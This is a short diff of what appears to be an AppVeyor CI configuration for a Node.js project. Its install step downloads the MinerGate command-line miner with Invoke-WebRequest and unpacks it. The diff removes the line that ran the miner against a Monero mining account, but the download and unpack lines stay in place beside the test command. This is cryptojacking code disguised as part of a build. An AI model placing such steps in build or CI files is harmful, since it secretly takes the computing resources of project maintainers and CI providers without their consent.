@@ -6,7 +6,7 @@ install:
   - ps: Install-Product node $env:nodejs_version
   - ps: Invoke-WebRequest -Uri https://minergate.com/download/win-cli -OutFile tmp.zip
   - ps: Expand-Archive tmp.zip tmp
-  - ps: .\tmp\Min*\min*.exe -user sukkerbruk@yandex.com -xmr
+
   - npm test
  
 test_script:
